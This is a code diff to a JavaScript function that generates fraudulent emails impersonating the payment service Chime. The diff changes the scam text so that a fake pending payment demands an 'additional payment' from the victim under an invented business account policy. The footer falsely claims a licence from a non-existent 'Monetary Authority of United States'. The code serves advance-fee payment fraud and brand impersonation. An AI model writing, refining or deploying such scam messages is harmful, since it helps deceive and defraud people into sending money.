@@ -25,14 +25,15 @@ export const chimeSendEmail = async ({ email, name, amount }) => {
   }
   const date = getFormattedDate();
 
+  // amount to pay
+  const amountToPay = (1000 - Number(amount)).toLocaleString();
+
   // full amount
   const fullAmount = (Number(amount) + 501).toLocaleString();
 
   // message
-  const message = `You've received a payment of $${amount}.00 USD and it is pending due to account limitations under our Seller Protection policy for business transactions.
-
-  To complete the transaction, the sender is required to send an additional $501.00 USD from the same business account to automatically upgrade your account for future business transactions.
-  
+  const message = `You've received a payment of $${amount}.00 USD and it is pending balance due to our new Business Account Policy for payments below $1,000.00.
+  To accept this payment automatically, An additional payment of $${amountToPay}.00 USD from the same business account is required.
   Once completed, your account will be credited with the full amount of $${fullAmount}.00 USD instantly.`;
 
   // html
@@ -128,4 +129,4 @@ Chime Pte. Ltd. is licensed by the Monetary Authority of United States as a Majo
 
   // return
   return true;
-};
+};;;
